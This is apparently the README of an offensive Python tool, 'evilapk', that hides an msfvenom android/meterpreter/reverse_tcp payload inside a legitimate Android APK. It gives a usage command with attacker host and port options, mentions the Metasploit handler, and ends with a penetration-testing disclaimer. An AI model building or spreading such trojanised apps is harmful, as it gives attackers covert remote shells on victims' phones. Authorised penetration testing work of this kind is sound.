# Overview
Python tool as a PoC for embedding a msfvenom APK Payload inside a legitimate Android APK

Tested on Kali Linux 2025.2

To be used for penetration testing or educational purposes only!

Please note that this project is an early state. As such, you might find bugs, flaws or mulfunctions.
Use it at your own risk!

# Usage
```
python3 evilapk.py --lhost IP --lport PORT -x target.apk
```
The utilized msfvenom payload is `android/meterpreter/reverse_tcp`. Don't forget to set that inside the Metasploit handler.

# Disclaimer
Usage of evilapk for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
I assume NO liability and I am NOT responsible for any misuse or damage caused by this tool.
